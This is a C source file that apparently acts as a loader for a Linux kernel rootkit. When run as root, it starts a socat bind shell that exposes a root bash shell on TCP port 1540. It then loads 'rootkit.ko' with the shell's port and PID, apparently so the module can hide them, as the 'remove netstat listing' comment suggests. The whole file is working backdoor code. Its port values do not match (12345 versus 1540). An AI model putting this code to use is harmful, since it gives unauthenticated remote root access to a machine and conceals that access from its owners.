// if socat is not installed, install socat

// test with echo $BASHPID

// remove netstat listing

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>

#define PORT			12345
#define ADDRESS			"reuseaddr"
#define MOD_PATH		"./rootkit.ko"
#define ROOT_UID    	0
#define PATH_TO_SOCAT	"/usr/bin/socat"


static inline int finit_module(int fd, const char *uargs, int flags)
{
    return syscall(__NR_finit_module, fd, uargs, flags);
}

int main () {
    pid_t pid;
    uid_t uid;

// check if socat is installed, if not, install
// TODO

// check if this programm is run as root
    uid = getuid();
    if (uid != ROOT_UID) {
        fprintf(stderr, "Error: Please run this program as root\n");
        return EXIT_FAILURE;
    }


    char cmd[80];
    sprintf(cmd,"%s%d%s%s","tcp-listen:",PORT,",fork,",ADDRESS);
    printf("%s",cmd);

    pid = fork();

    if(pid == 0) {

        char *const arg[] = {"socat", "tcp-listen:1540,fork,reuseaddr" ,"exec:/bin/bash,pty,stderr,setsid",NULL };
        char *const env[] = {NULL};

// open socat channel
        execve(PATH_TO_SOCAT, arg, env);


    } else if (pid > 0) {

// call insmod with pid as argument
        long res;
        char param_values[80];
        sprintf(param_values,"port_num=%d pid_num=%d",PORT,pid);
        printf("insmod %s\n",param_values);

        int fd = open(MOD_PATH, O_RDONLY | O_CLOEXEC);

        if (fd < 0) {
            perror("Unable to open module file"); // print system error
            return EXIT_FAILURE;
        }

        res = finit_module(fd, param_values,0);


        if (res != 0) {
            perror("Error when loading module");
            close(fd);
            return EXIT_FAILURE;
        }
        close(fd);

    } else {
        fprintf(stderr, "Error forking process.");
        exit(1);
    }

    return 0;
}
